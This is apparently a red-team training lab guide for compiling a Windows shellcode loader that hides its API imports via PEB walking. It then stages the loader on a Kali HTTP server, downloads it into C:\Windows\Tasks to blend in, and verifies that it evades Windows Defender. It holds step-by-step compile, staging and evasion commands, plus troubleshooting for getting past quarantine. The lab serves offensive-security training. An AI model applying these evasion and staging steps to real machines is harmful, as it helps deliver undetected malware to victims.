# Lab: Building and Staging a Shellcode Loader

## Overview

In this lab you will compile `loader.c` - a position-independent Windows x64 shellcode loader that resolves all Win32 APIs at runtime via PEB walk - into a Windows PE binary. The primary build method uses the MinGW cross-compiler on Kali. An optional section walks through building the same binary on Windows using the MSVC `cl.exe` toolchain. Once built, you will stage the binary on Kali's HTTP server, download it to the Windows VM, and execute it without a shellcode argument to confirm it exits silently without triggering Windows Defender.

---

## Prerequisites

| Requirement | Details |
|---|---|
| OS (Target) | Windows 11 VM |
| OS (Attacker) | Kali Linux on the same subnet |
| Tools (Kali) | `x86_64-w64-mingw32-gcc`, Python 3 (both pre-installed) |
| Tools (Windows) | PowerShell 5.1+, Windows Defender real-time protection **enabled** |
| Source (Kali) | `/Lab-Artifacts/loader/loader.c` |
| Source (Windows) | `C:\Lab-Artifacts\loader\loader.c` |
| Network | Both VMs on the same host-only or internal network adapter |

> ⚠️ **Warning:** Perform this lab inside isolated virtual machines only. The loader is designed to execute arbitrary shellcode. Do not run it on production systems or outside a controlled lab environment.

---

## Lab Goals

- Understand why the loader contains no named API imports and what that means for static analysis
- Cross-compile a Windows x64 PE binary from Kali using MinGW
- (Optional) Build the same binary on Windows using MSVC `cl.exe`
- Stage the compiled binary on a Kali HTTP server and transfer it to the Windows VM via PowerShell
- Execute the loader without a payload argument and confirm it produces no Defender alert

---

## Background: What Does This Loader Do?

`loader.c` is a position-independent shellcode loader with two core evasion properties:

**No import table entries.** Instead of calling `GetProcAddress` or linking against named API stubs, the loader walks the Process Environment Block (PEB) at runtime to find `kernel32.dll`, then manually parses its export directory using precomputed djb2 hashes to resolve function addresses. A standard PE analysis tool will find no recognisable Win32 API names in the import directory.

**No embedded payload.** The shellcode is supplied at runtime as a command-line argument - either a local file path or an HTTP/HTTPS URL. The binary on disk contains no shellcode bytes, making static signature matching against the payload impossible.

When invoked with no argument the loader calls `GetCommandLineA`, finds an empty argv[1], and returns immediately. This is the behaviour you will verify in Part 4.

---

## Part 1: Build the Binary on Kali (Primary Method)

### Step 1 - Confirm the Cross-Compiler is Installed

```bash
x86_64-w64-mingw32-gcc --version
```

**Expected output:**
```
x86_64-w64-mingw32-gcc (GCC) 15-win32
```

If the command is not found, install it:

```bash
sudo apt update && sudo apt install -y mingw-w64
```

### Step 2 - Navigate to the Source Directory

```bash
cd /Lab-Artifacts/Loader/
ls
```

**Expected output:**
```
basic-loader.c  basic-loader.cs  loader.c
```

### Step 3 - Compile the Loader

```bash
x86_64-w64-mingw32-gcc \
    -o loader.exe \
    loader.c \
    -O2 \
    -masm=intel \
    -Wno-main \
    -Wno-array-bounds \
    -lkernel32 \
    -Wl,--subsystem,console \
    -Wl,-s
```

**Flags:**

| Flag | Purpose |
|---|---|
| `-O2` | Optimize for speed; also helps the compiler inline the PEB walk functions |
| `-masm=intel` | Intel assembly syntax - required for the `__readgsqword` intrinsic |
| `-Wno-main` | Suppresses warning about `void main` - intentional, process exits via `ExitProcess` |
| `-Wno-array-bounds` | Suppresses a false-positive from `__readgsqword` when cross-compiled on Linux; harmless at runtime on Windows |
| `-lkernel32` | The only external import library - all other APIs are resolved via PEB walk |
| `-Wl,--subsystem,console` | Sets the PE subsystem to console |
| `-Wl,-s` | Strips symbol table and debug info from the output binary |

**Expected output:**
**no output** or possibly a warning:
```
/tmp/ccXXXXXX.s: Assembler messages:
/tmp/ccXXXXXX.s:101: Warning: redundant segment overrides
```

> 📝 **Note:** The "redundant segment overrides" assembler warning is a cross-compilation artifact from `__readgsqword`. It is harmless - the GS-relative memory read works correctly on Windows x64 at runtime.

### Step 4 - Verify the Output

```bash
file loader.exe
```

**Expected output:**
```
loader.exe: PE32+ executable for MS Windows 5.02 (console), x86-64 (stripped to external PDB), 9 sections
```

Confirm no recognizable API names appear in the import table:

```bash
x86_64-w64-mingw32-objdump -x loader.exe | grep -A 20 "Import Tables"
```

The only DLL listed should be `KERNEL32.dll` with a minimal set of CRT startup symbols - not `VirtualAlloc`, `CreateThread`, or any other API the loader actually calls at runtime.

---

## Part 1 (Optional): Build on Windows Using cl.exe

> 📝 **Note:** This section is for Windows-only builds using MSVC. If you completed Part 1 on Kali using MinGW, skip to Part 2. This section requires Visual Studio Community 2019 or 2022 with the **Desktop development with C++** workload installed.

### Step 1 - Open a Developer Command Prompt

1. Press **Start** and search for **Developer Command Prompt for VS 2022** (or 2019).
2. Open it - this sets up the MSVC environment variables and PATH automatically.
3. Confirm `cl.exe` is on the path:
   ```cmd
   cl
   ```
   The first line of output should show the MSVC version banner.

### Step 2 - Navigate to the Source Directory

```cmd
cd C:\Lab-Artifacts\Loader\
dir
```

**Expected output:**
```
loader.c
```

### Step 3 - Compile the Loader

```cmd
cl.exe loader.c /Fe:loader.exe /GS- /EHs-c- /O1 /Zl /link /NODEFAULTLIB /ENTRY:main /FIXED kernel32.lib
```

**Flags:**

| Flag | Purpose |
|---|---|
| `/Fe:loader.exe` | Sets the output executable filename |
| `/GS-` | Disables buffer security checks - prevents the compiler inserting a `__security_init_cookie` call that would require CRT |
| `/EHs-c-` | Disables C++ exception handling - removes exception table entries and CRT dependencies |
| `/O1` | Optimize for size |
| `/Zl` | Omits the default library name from the `.obj` file - cleaner NODEFAULTLIB builds |
| `/NODEFAULTLIB` | Prevents the linker from pulling in CRT or any default libraries |
| `/ENTRY:main` | Sets `main` as the raw PE entry point, bypassing the CRT startup wrapper |
| `/FIXED` | Disables base relocation (no `.reloc` section) - produces a smaller, fixed-address binary |
| `kernel32.lib` | The only import library needed - all other Win32 APIs are resolved at runtime |

**Expected output:**
```
Microsoft (R) C/C++ Optimizing Compiler Version ...
loader.c
Microsoft (R) Incremental Linker Version ...
```

No errors or warnings should appear. The binary is written to `C:\Lab-Artifacts\loader\loader.exe`.

> 📝 **Note:** If building on Windows, skip Part 2 and go directly to Part 3, downloading the binary from `C:\Lab-Artifacts\Loader\` instead of from Kali.

---

## Part 2: Stage the Binary on Kali

### Step 1 - Start the HTTP Server

Open a new terminal on Kali. Serve the compiled binary from the same directory:

```bash
cd /Lab-Artifacts/Loader/
python3 -m http.server 8080
```

**Expected output:**
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Leave this terminal open - it will log the download request from the Windows VM.

### Step 2 - Note Your Kali IP Address

Open a second Kali terminal:

```bash
ip -4 addr show eth0 | grep inet
```

> 📝 **Note:** Replace `eth0` with your actual interface name if different (e.g. `eth1`, `ens33`). Record the IP - you will use it in the PowerShell download command.

---

## Part 3: Transfer the Binary to the Windows VM

### Step 1 - Open an Elevated PowerShell Session on Windows

1. Right-click the Start menu on the Windows VM.
2. Select **Windows PowerShell (Admin)** or **Terminal (Admin)**.

### Step 2 - Download the Binary to C:\Windows\Tasks\

`C:\Windows\Tasks\` is a writable system directory that blends into normal Windows activity. Replace `<KALI-IP>` with the IP recorded in Part 2 Step 2:

```powershell
Invoke-WebRequest -Uri 'http://<KALI-IP>:8080/loader.exe' `
                  -OutFile 'C:\Windows\Tasks\loader.exe'
```

**Expected behaviour:**
- The file downloads silently.
- On your Kali terminal you will see:
  ```
  192.168.x.x - - [date] "GET /loader.exe HTTP/1.1" 200 -
  ```
- Windows Defender should **not** raise an alert. If it does, note the threat name and refer to the Common Errors section.

### Step 3 - Confirm the File Arrived

```powershell
Get-Item 'C:\Windows\Tasks\loader.exe' | Select-Object Name, Length, LastWriteTime
```

**Expected output:**
```
Name                        Length LastWriteTime
----                        ------ -------------
loader.exe      <size> <timestamp>
```

---

## Part 4: Execute the Loader and Verify No Detection

### Step 1 - Run the Loader Without a Shellcode Argument

```powershell
C:\Windows\Tasks\loader.exe
```

**Expected behaviour:**
- The process launches and exits immediately with no output.
- No Defender toast notification appears.
- No quarantine event is logged.

> 📝 **Note:** When no argument is supplied, `GetCommandLineA` returns only the process image path. The loader's `firstArg()` function parses past argv[0] and finds an empty string, causing the early-exit check `if (!*arg) return;` to fire before any memory is allocated or any suspicious API sequence runs. The process terminates cleanly.

### Step 2 - Confirm No Defender Alert Was Raised

Use a new PowerShell window without AMSI evasion to run the following command:

```powershell
Get-MpThreatDetection | Select-Object -Last 5 | Format-List
```

**Expected result:** No new entries, or only entries pre-dating the lab. If a detection entry appears with a timestamp matching the execution, the binary was flagged - refer to the Common Errors section.

### Step 3 - Check the Defender Event Log

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
  Where-Object { $_.Id -in @(1116, 1117) } |
  Select-Object TimeCreated, Id, Message |
  Select-Object -First 5 |
  Format-List
```

**Expected result:** No events with a timestamp matching your execution. A clean result here confirms the binary passed Defender's on-write and on-execute static scanning.

### Step 4 - Confirm the Process Exited Cleanly

```powershell
Get-EventLog -LogName Application -Source "Application Error" -Newest 5 |
  Where-Object { $_.Message -like "*loader*" } |
  Format-List
```

**Expected result:** No entries. The loader exited via `ExitProcess(0)` normally.

---

## What a Successful Lab Looks Like

| Check | Expected Result |
|---|---|
| Binary compiles on Kali | `PE32+ executable (console) x86-64 (stripped)` |
| No recognisable APIs in import table | Only CRT startup symbols under `KERNEL32.dll` |
| Binary downloads to Windows | No Defender alert on write |
| Loader runs with no argument | Process exits immediately, no output |
| `Get-MpThreatDetection` | No new detection entries |
| Defender Event Log (1116/1117) | No events matching the execution timestamp |

---

---

## Common Errors and Fixes

| Error | Cause | Fix |
|---|---|---|
| `x86_64-w64-mingw32-gcc: command not found` | MinGW not installed on Kali | `sudo apt install -y mingw-w64` |
| `undefined reference to '__main'` | Missing CRT startup - wrong flags used | Use the exact gcc flags from Part 1 Step 3; do not add `-nostdlib` |
| Defender quarantines the binary on download | Static signature match against the compiled PE | Verify `-Wl,-s` stripped symbols; check objdump output for embedded strings |
| `Invoke-WebRequest` times out | Kali HTTP server not running or wrong IP | Confirm `python3 -m http.server 8080` is running; verify IP with `ip a` |
| `Access is denied` writing to `C:\Windows\Tasks\` | PowerShell session is not elevated | Re-open PowerShell as Administrator |
| `cl.exe` not found in Developer Command Prompt | Wrong shortcut used | Use **Developer Command Prompt for VS 2022**, not a standard cmd or PowerShell window |
| `/FIXED` causes linker warning about relocations | ASLR conflict in some VS versions | Remove `/FIXED` - it reduces binary size but is not required for the loader to function |
